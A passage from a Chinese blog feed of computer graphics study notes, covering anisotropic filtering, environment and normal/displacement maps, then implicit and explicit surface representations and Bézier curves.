<p>虽然和一开始的 point sample有了很大的进步，但是有一个严重的问题是，远处的地板产生一种过曝的现象，完全糊在了一起。</p>
<h3 id="利用各向异性优化mipmap"><a href="#利用各向异性优化mipmap" class="headerlink" title="利用各向异性优化mipmap"></a>利用各向异性优化mipmap</h3><p>为什么 Mipmap 会出现这种情况：</p>
<ul>
<li>Mipmap所规定的区域查询，这个区域必须是正方形，而纹理映射中可不仅仅只有正方形</li>
<li>3线性插值本身就含有误差</li>
</ul>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200506211513383.png" alt="img" style="zoom:50%;" loading="lazy">

<p>可以看出不同screen space的像素点所对应的footprint是不同的，有长方形，甚至是不规则图形，那么针对这种情况，有的所需要的是仅仅是水平方向的高 Level，有的需要的仅仅是竖直方向上的高 Level，因此这也就启发了各向异性的过滤来改善Mipmap。</p>
<blockquote>
<p>各向异性过滤 （Anisotropic Filtering ）是用来过滤、处理当视角变化导致3D物体表面倾斜时造成的纹理错误。传统的双线性和三线性过滤技术都是指“Isotropy”（各向同性）的，其各方向上矢量值是一致的，就像正方形和正方体。</p>
</blockquote>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200506211849783.png" alt="img" style="zoom: 67%;" loading="lazy">

<p>图示来说，Mipmap所求得是上图中对角线的图片，而各向异性是针对长宽进行不同比例的缩放来生成图片，在具体的映射中，需要选择一个最合适的纹理。（这个跟上面的Mipmap一样，所额外需要的存储空间仅增加了原来的 $\frac{1}{3}$ ，故对性能几乎没有影响。打游戏的人应该知道游戏画面设置里有各向异性过滤这个选项，其中的 2x、4x、16x 其实就是所额外生成的贴图数量，由于其仅对内存开销有一定的增加，并不会导致性能上的损失降低帧率，所以打游戏建议把各向异性拉满）</p>
<p>利用这样不同的贴图，更加精细的选择后结果就会明显好很多：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200506212145966.png" alt="img" style="zoom:50%;" loading="lazy">

<p>当然这只是一种改善 Mipmap 的方法，并不能真正解决问题。</p>
<h2 id="纹理映射的运用"><a href="#纹理映射的运用" class="headerlink" title="纹理映射的运用"></a>纹理映射的运用</h2><h3 id="环境光映射（Environment-Map）"><a href="#环境光映射（Environment-Map）" class="headerlink" title="环境光映射（Environment Map）"></a>环境光映射（Environment Map）</h3><p>顾名思义就是将环境光存储在一个贴图之上。想象这样一个情形，光照离物体的距离十分遥远，因此对于物体上的各个点光照方向几乎没有区别，那么唯一的变量就是人眼所观察的方向了，因此各个方向的光源就可以用一个球体进行存储，即任意一个3D方向，都标志着一个texel：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200511151923912.png" alt="img" style="zoom: 67%;" loading="lazy">

<p>就跟前面的地球仪一样，利用墨卡托投影或是其它类似的方法将球上的信息转换成一个平面上，就得到了环境Texture了:</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200511154414900.png" alt="img" style="zoom:67%;" loading="lazy">

<p>但是用一个球体来存储环境光有一个比较明显的缺点，仔细观察上面展开的Texture图可以观察看到，上方和下方均有较为严重的扭曲，因此另外一种存储的方法就是Cube Map，也就是天空盒：</p>
<p>一个天空盒有6幅Texture来表示，明显相对球体少了很多扭曲的情况，但是中间多了一步从方向到面上的计算：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200511154533284.png" alt="img" style="zoom:67%;" loading="lazy">

<p>简单来说就是利用球心与球面连线方向计算出与对应平面上的交点坐标，剔除平面所对应的一维，剩下来的两维坐标转换到 $(0,1)$范围之内即为 $(u,v)$ 坐标。一个图例：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200511154602554.png" alt="img" style="zoom: 50%;" loading="lazy">

<h3 id="凹凸贴图-x2F-法线贴图（Bump-x2F-Normal-Map）"><a href="#凹凸贴图-x2F-法线贴图（Bump-x2F-Normal-Map）" class="headerlink" title="凹凸贴图&#x2F;法线贴图（Bump&#x2F;Normal Map）"></a>凹凸贴图&#x2F;法线贴图（Bump&#x2F;Normal Map）</h3><p>想向有一个球体，由许多三角形构成。我们想把它修改成一个月球模型，那我们知道月球表面有许多坑坑洼洼的小洞，十分不平整，如何表示这种洞的凹或者丘的凸呢？如果继续采用用许多三角形表示的话，工作量又上了一个台阶。有没有什么好的方法呢？</p>
<p>我们仍然认为所要设计的月球模型内核是一个光滑球体，但是我们可以在纹理贴图上定义每个点的高度进而改变法线向量进而改变shading。Bump&#x2F;Normal Map就是这种思想，它存储了每一个点逻辑上的相对高度（可为负值），该高度的变化实际上表现了物体表面凹凸不平的特质，利用该高度信息，再计算出该点法线向量，最后再利用该法线计算光照，这就是Bump Map的过程。</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200511145627785.png" alt="img" style="zoom: 50%;" loading="lazy">

<p>那么所需要关心的问题就是，如何从相对高度计算出法线向量呢？</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200511150137984.png" alt="img" style="zoom:50%;" loading="lazy">

<p>该过程也很容易理解，2维情况如下：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200511150436538.png" alt="img" style="zoom:50%;" loading="lazy">

<p>即求一个点的切线之后再逆时针旋转90°求法线。</p>
<p>3维情况可以类推得到：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200511150514337.png" alt="img" style="zoom:50%;" loading="lazy">

<p>正如最后一点所标注的，所有计算出来的法线都是局部坐标即切线空间之下，因此还需要左乘 $[t \quad b \quad n ]$ 矩阵转到(世界)相机坐标系之下得到正确法向。</p>
<h3 id="位移贴图（Displacement-Map）"><a href="#位移贴图（Displacement-Map）" class="headerlink" title="位移贴图（Displacement Map）"></a>位移贴图（Displacement Map）</h3><p>Displacement Map其实又与Bump Map十分类似了，出发点都是改变点的相对高度来改变法线。但Bump Maps是逻辑上的高度改变，它实则并没有改变内部的模型，是假的改变；而Displacement Map则是物理上的高度改变，它真正改变了模型。二者的区别就在此处，可以通过物体阴影的边缘发现这点：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200511151211713.png" alt="img" style="zoom: 67%;" loading="lazy">
]]></content>
      <categories>
        <category>计算机图形学</category>
      </categories>
      <tags>
        <tag>着色</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机图形学五：几何-Geometry</title>
    <url>/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h1 id="几何（Geometry）"><a href="#几何（Geometry）" class="headerlink" title="几何（Geometry）"></a>几何（Geometry）</h1><p>几何与计算机图形学密不可分，图形的表达、呈现等几乎都以几何形体的方式呈现。</p>
<p>例如水杯：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200513193525634.png" alt="img" style="zoom:40%;" loading="lazy">

<p>水滴：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200513193624264.png" alt="img" style="zoom:40%;" loading="lazy">

<p>建筑群：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200513193721721.png" alt="img" style="zoom:40%;" loading="lazy">

<p>几何的形状与多少决定了渲染的复杂程度，如何表示好各种各样的模型是几何部分的主要研究内容之一。俗话说点构线，线构面，面构体，而几何形体的最基本要素，就是曲线与曲面。</p>
<span id="more"></span>

<h1 id="曲面（Curved-Surface）"><a href="#曲面（Curved-Surface）" class="headerlink" title="曲面（Curved Surface）"></a>曲面（Curved Surface）</h1><h2 id="隐式曲面（Implicit-Surface）"><a href="#隐式曲面（Implicit-Surface）" class="headerlink" title="隐式曲面（Implicit Surface）"></a>隐式曲面（Implicit Surface）</h2><h3 id="隐式曲面特点"><a href="#隐式曲面特点" class="headerlink" title="隐式曲面特点"></a>隐式曲面特点</h3><p>所谓隐式曲面指的是并不会告诉你任何点的信息，只会告诉你该曲面上所有点满足的关系。来举个具体的隐式曲面的例子：<br>$$<br>x^2+y^2+z^2&#x3D;1<br>$$<br>大部分人一眼就看出来这是一个3维球体的方程，一般地的我们会把隐式曲面的代数方程写作 $f(x,y,z) &#x3D; 0$，则该球体的隐式曲面方程表示为：<br>$$<br>f(x,y,z) &#x3D; x^2 + y^2+z^2-1<br>$$<br>对于隐式方程来说因为没有给出任何点的信息，因此<strong>如何判断所给出的隐式方程描述的是一个怎样的形状十分困难</strong>，如下图这样一个例子:</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200513194653455.png" alt="img" style="zoom: 33%;" loading="lazy">

<p>但是它也有好处：<strong>可以十分容易的判断出一点与曲面的关系</strong>，即我们可以将具体的点坐标代入方程，如果 $f(x,y)&#x3D;0$，就说明该点是构成曲面的要素，如果 $f(x,y)&gt;0$，就说明该点在曲面外，相反的，如果 $f(x,y)&lt;0$，就说明该点在曲面内。</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200513194921740.png" alt="img" style="zoom: 33%;" loading="lazy">

<p>当然代数曲面只是隐式曲面的一种表现形式，接下来将会一一介绍隐式曲面的其他表现形式。</p>
<h3 id="代数曲面（Algebraic-Surface）"><a href="#代数曲面（Algebraic-Surface）" class="headerlink" title="代数曲面（Algebraic Surface）"></a>代数曲面（Algebraic Surface）</h3><p>隐式曲面可以通过上述所介绍的代数表达式得到，可以得到许许多多不同的几何曲面：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200513200359619.png" alt="img" style="zoom: 50%;" loading="lazy">

<p>但这种表达方式存在多种缺点，首先是只根据表达式大多数情况下根本无法确定所要表达的到底是什么模型，其次就是方程式大多只能表示规则的形状，如果是很复杂的形状的叠加又该怎么办呢？</p>
<h3 id="构造固体几何（Constructive-Solid-Geometry）"><a href="#构造固体几何（Constructive-Solid-Geometry）" class="headerlink" title="构造固体几何（Constructive Solid Geometry）"></a>构造固体几何（Constructive Solid Geometry）</h3><p>Constructive Solid Geometry（CSG）指的是可以对各种不同的几何做布尔运算，如并，交，差：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200513200819866.png" alt="img" style="zoom:50%;" loading="lazy">

<p>通过这些操作可以得出各种更为复杂的几何：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200513200901573.png" alt="img" style="zoom:50%;" loading="lazy">

<p>通过CSG的方法可以一定程度上缓解隐式曲面难以表现复杂形体的困境。</p>
<h3 id="符号距离函数（Signed-Distance-Function）"><a href="#符号距离函数（Signed-Distance-Function）" class="headerlink" title="符号距离函数（Signed Distance Function）"></a>符号距离函数（Signed Distance Function）</h3><p>首先看这么一张图：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200513201149745.png" alt="在这里插入图片描述" style="zoom:50%;" loading="lazy">

<p>从左往右看，是两个球体慢慢混合（blend）至一个球体，可以从中间过程看出这种混合过程伴随这球体形体的变化，显得混合的十分自然真实，如何表达出这种曲面的变换呢？</p>
<blockquote>
<p>符号距离函数（sign distance function），简称SDF，又可以称为定向距离函数（oriented distance function），在空间中的一个有限区域上确定一个点到区域边界的距离并同时对距离的符号进行定义：点在区域边界内部为正，外部为负，位于边界上时为0。</p>
</blockquote>
<p>对，我们可以通过空间任意一点到各个几何物体表面的距离，对这些距离做各种各样的运算操作最后得到的一个最终的距离函数，举一个简单的例子:</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200513201652984.png" alt="在这里插入图片描述" style="zoom:50%;" loading="lazy">

<p>对于这样一个二维平面，定义空间中每一个点的 $SDF$ 为该点到阴影区域右边界的垂直距离，在阴影内部为负，外部为正，右边界即为形体表面，其上点 $SDF$ 为0。因此对于 A 和 B 两种阴影来说的 $SDF$ 分别如上图下半部分所示。有了 $SDF(A),SDF(B)$ 之后对这两个距离函数选择性的做一些运算得到最终的距离函数，这里采用最简单的 $SDF &#x3D; SDF(A)+SDF(B)$ 来表达混合这一变化，最终得到的 $SDF$ 为零的点的集合即为混合之后曲面边界，对该例子来说，就是两道阴影之间中点的一条线：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/202005132022212.png" alt="在这里插入图片描述" style="zoom: 67%;" loading="lazy">

<p>即符号距离函数来表达隐式曲面的最基本思路是：根据 $SDF$ 为0的点来描绘物体曲面。因此对于一开始的那个例子来说，只需合理定义空间中任意一个点的 $SDF$，再令 $SDF$ 为0即可得到混合的效果了。</p>
<h3 id="水平集（Level-Set）"><a href="#水平集（Level-Set）" class="headerlink" title="水平集（Level Set）"></a>水平集（Level Set）</h3><p>水平集的方法其实与 $SDF$ 很像，也是找出函数值为0的地方作为曲线，但不像 $SDF$ 会空间中的每一个点有一种严格的数学定义，而是对空间用一个个格子去近似一个函数（将距离存储在表格中），如下：</p>
<p><img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200513203136928.png" alt="在这里插入图片描述" loading="lazy"></p>
<p>对该面内的每一个点利用已经定义好的格子值进行双线性插值（前一节纹理映射提到）就可以得到任意一点的函数值，找出所有值为0的点作为曲面。（类似于地理中的等高线？？）</p>
<p>该方法的好处是对于 $SDF$，我们可以更加显示的区空间曲线的形状。该方法广泛的运用在医学成像和物理模拟之中，例如下图我们可以记录下人体组织表面的各个密度，根据组织密度相同的点进行连接绘制得到相应组织的大致形状：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200513203534908.png" alt="在这里插入图片描述" style="zoom:50%;" loading="lazy">

<h3 id="分型几何（Fractals）"><a href="#分型几何（Fractals）" class="headerlink" title="分型几何（Fractals）"></a>分型几何（Fractals）</h3><p>分型几何是指许许多多自相似的形体最终所组成的几何形状。</p>
<p>如雪花是一个六边形，放大之后会发现每一个边上又是一个六边形，再放大六边形边上的六边形边上又是六边形，就这样无限套娃，有点递归的意思。</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200513203939268.png" alt="在这里插入图片描述" style="zoom: 50%;" loading="lazy">

<p>综上，<strong>隐式曲面具有形式简单，轻易判断点与曲面关系等优点，但难以采样曲面点和模拟过于复杂的形状</strong>。</p>
<h2 id="显示曲面（Explicit-Surface）"><a href="#显示曲面（Explicit-Surface）" class="headerlink" title="显示曲面（Explicit Surface）"></a>显示曲面（Explicit Surface）</h2><h3 id="显示曲面特点"><a href="#显示曲面特点" class="headerlink" title="显示曲面特点"></a>显示曲面特点</h3><p>对于显式曲面来说是与隐式曲面相对应的，<strong>所有曲面的点被直接给出，或者可以通过映射关系直接得到</strong>，如下图：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200513195436834.png" alt="img" style="zoom: 50%;" loading="lazy">

<p>虽然没有直接给出点的数据 $x，y，z$，但是拥有 $u，v$ 的取值范围以及从 $ (u,v)\rightarrow(x,y,z)$ 的映射关系，那么只需要将所有的 $u，v$ 代入自然就可求得 $x，y，z$（类似于从texture到模型的映射）。例如：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/image-20220710172611891.png" alt="image-20220710172611891" style="zoom: 50%;" loading="lazy">

<p>我们可以很轻松的将所有的 $u，v$ 代入自然就可求得 $x，y，z$，进而求得整个曲面。</p>
<p><strong>区别隐式曲面与显示曲面的关键就在于是否可以直接表示出所有的点</strong>。隐式曲面难以采样曲面上的点，但是可以轻易判断点与曲面的关系，对于显式曲面来说恰恰相反，我们可以很轻易的采样到所有的点，但是给予你任意一点却很难判断它与曲面的关系。因此没有哪一种的几何表现方式是更好的，根据具体的环境条件来选择隐式还是显式才是合理的做法。</p>
<p>下面介绍几种显示曲面的表现形式：</p>
<h3 id="点云（Point-Cloud）"><a href="#点云（Point-Cloud）" class="headerlink" title="点云（Point Cloud）"></a>点云（Point Cloud）</h3><p>很多很多的点构成的曲面，直接有着所有点的信息，点多模型细节就多，点少模型细节就少。</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200513204935372.png" alt="在这里插入图片描述" style="zoom:50%;" loading="lazy">

<h3 id="多边形网格-Polygon-Mesh"><a href="#多边形网格-Polygon-Mesh" class="headerlink" title="多边形网格(Polygon Mesh)"></a>多边形网格(Polygon Mesh)</h3><p>最常用的曲面表现形式，简单来说通过定义各个多边形面的顶点以及顶点之间的连接关系就可以得到许许多多的三角形面或是四边形面，再通过这些面来近似表现出我们想要的模型效果。</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200513205740564-165744539367718.png" alt="在这里插入图片描述" style="zoom: 50%;" loading="lazy">

<h3 id="The-Wavefront-Object-File（-obj）"><a href="#The-Wavefront-Object-File（-obj）" class="headerlink" title="The Wavefront Object File（.obj）"></a>The Wavefront Object File（.obj）</h3><p>该形式就是利用文件存储几何的信息。例如一个立方体的模型数据例子，利用<code>.obj</code>文件才存储信息：</p>
<p>3-10行定义了立方体的8个顶点信息。</p>
<p>12-25行定义了这些顶点的纹理坐标信息（每个面4个点，共6个面所以最多有24种不同的纹理坐标信息，这里有一些纹理对于不同面上的点是公用的）。</p>
<p>27-34行定义了6个面的法线信息。</p>
<p>36-47行中，$f$ 代表一个面，其中 $x&#x2F;x&#x2F;x$ 的第一位表示是哪个顶点，第二位表示该顶点纹理坐标是第几个，第三位表示法线信息是第几个。 3个 $x&#x2F;x&#x2F;x$ 表示3个顶点的信息构成一个三角形面。</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200513210058260.png" alt="在这里插入图片描述" style="zoom: 67%;" loading="lazy">

<h1 id="曲线（Curve）"><a href="#曲线（Curve）" class="headerlink" title="曲线（Curve）"></a>曲线（Curve）</h1><h2 id="贝塞尔曲线（Bezier-Curves）"><a href="#贝塞尔曲线（Bezier-Curves）" class="headerlink" title="贝塞尔曲线（Bézier Curves）"></a>贝塞尔曲线（Bézier Curves）</h2><p>贝塞尔曲线(Bézier curve)，又称贝兹曲线或贝济埃曲线，是应用于二维图形应用程序的数学曲线。一般的矢量图形软件通过它来精确画出曲线，<strong>贝塞尔曲线由线段与节点组成，节点是可拖动的支点，线段像可伸缩的皮筋</strong>，我们在绘图工具上看到的钢笔工具就是来做这种矢量曲线的。贝塞尔曲线是计算机图形学中相当重要的参数曲线，在一些比较成熟的位图软件中也有贝塞尔曲线工具，如PhotoShop等。</p>
<p>贝塞尔曲线于1962，由法国工程师皮埃尔·贝塞尔（Pierre Bézier）所广泛发表，他运用贝塞尔曲线来为汽车的主体进行设计。贝塞尔曲线最初由Paul de Casteljau于1959年运用de Casteljau演算法开发，以稳定数值的方法求出贝塞尔曲线。</p>
<p>首先看一下一条实际的贝塞尔曲线长什么样子：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200514201840173.png" alt="img" style="zoom:50%;" loading="lazy">

<p>其中 $p_0,p_1,p_2,p_3$ 为<strong>控制点</strong>，蓝色所表示曲线就是贝塞尔曲线了，可以从图中观察到，**曲线会与初始与终止端点相切，并且经过起点 $p_0$ 与终点 $p_3$**。那么这样一条曲线究竟是怎么得到的呢？需要用到 Casteljau 算法。</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200514202351960.png" alt="img" style="zoom: 67%;" loading="lazy">

<p>首先从简单的3个控制点情形出发，示意如何画出曲线。（n个控制点得到的是n-1次曲线，如图中3个控制点便是2次贝塞尔曲线）</p>
<p>正如一开始所说，第一步选定一个时间参数 $t\in[0,1]$，在 $b_0b_1$ 线段之上利用 $t$ 值进行线性插值：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200514202645898.png" alt="img" style="zoom: 67%;" loading="lazy">

<p>即 $b_0^1 &#x3D; b_0+t*(b_1-b_0)$，得到 $b_0^1$ 之后在 $b_1b_2$ 线段上重复做相同的线性插值得到点 $b_1^1$：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200514202954557.png" alt="img" style="zoom:67%;" loading="lazy">

<p>通过给点参数 $t$ 计算得到点 $b_0^1,b_1^1$之后将两点连接，接下来如法炮制在 $b_0^1b_1^1$ 线段之上再进行一次线性插值：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200514203238640.png" alt="img" style="zoom:67%;" loading="lazy">

<p>如此便成功获得了如图所示的3个控制点之下的2次贝塞尔曲线上的一点 $b_0^2$了，那么对所有的 $t\in[0,1]$ 都重复上述的过程，理论上就可以得到无数个位于贝塞尔曲线上的点，进而得到贝塞尔曲线了。通过这样一个简单的3个控制点的例子，相信很快就能理解贝塞尔曲线的原理，那么对于4个控制点，5个控制点，乃至任意控制点步骤都是类似的。<strong>其核心所在就是多次的线性插值，并在生成的新的顶点所连接构成的线段之上递归的执行这个过程，直到得到最后一个顶点</strong></p>
<p>如下图这样一个4个控制顶点的例子，步骤完全类似：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/2020051420371525.png" alt="img" style="zoom:67%;" loading="lazy">

<p>当然这只是图形上的表示，如何定量表示呢？同样以一开始的3个控制点为例，利用二次插值的数学公式，将贝塞尔曲线方程展开看看：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200514204252506.png" alt="img" style="zoom: 67%;" loading="lazy">

<p>其实看到这就已经非常清楚了，最终得到的贝塞尔曲线方程恰好就是一个关于参数 $t$ 的二次方程，如果细心观察的话，其实可以发现控制点的系数是非常有规律的，很像二项系数，因此可以总结规律得到一个任意控制点组成的贝塞尔曲线的方程如下：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/image-20220710185955642.png" alt="image-20220710185955642" style="zoom:50%;" loading="lazy">

<p>对于这样一个特殊系数其实也有一个多项式与之对应，正是伯恩斯坦多项式（Bernstein polynomials），其定义如图中下方所示：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/image-20220710190109505.png" alt="image-20220710190109505" style="zoom:50%;" loading="lazy">

<p>其实这就是多项式展开的那个系数，高中好像学过，我把它理解成这样：<br>$$<br>B_i^n(t)&#x3D;C_n^it^i(1-t)^{n-i}<br>$$<br>其中 $C_n^i$ 就是排列组合里面那个玩意儿。</p>
<p>贝塞尔曲线的定义以及数学表达都介绍了，最后对贝塞尔曲线的几点性质做一个概括:</p>
<ul>
<li><strong>必定经过起始与终止控制点</strong></li>
<li><strong>必定经与起始与终止线段相切</strong></li>
<li><strong>具有仿射变换性质，可以通过移动控制点移动整条曲线</strong>（简要来说，通过由控制点得到的贝塞尔曲线进行仿射变换与对控制点进行同样的仿射变换后得到的贝塞尔曲线是一样的）</li>
<li><strong>凸包性质，曲线一定不会超出所有控制点构成的多边形范围</strong></li>
</ul>
<p>什么是凸包（convex hull）？想象墙上有许多图钉，我们需要用一根橡皮筋把这些图钉围住，于是我们开始会让橡皮筋尽可能的撑大，然后松手放开橡皮筋，它所形成的多边形即为凸包，如图中蓝色曲线所示：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/image-20220710191328529.png" alt="image-20220710191328529" style="zoom: 33%;" loading="lazy">

<p>贝塞尔曲线是完美的吗？来看个有11个控制点的例子：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%BA%94%EF%BC%9A%E5%87%A0%E4%BD%95-Geometry/20200514205439781.png" alt="img" style="zoom:50%;" loading="lazy">

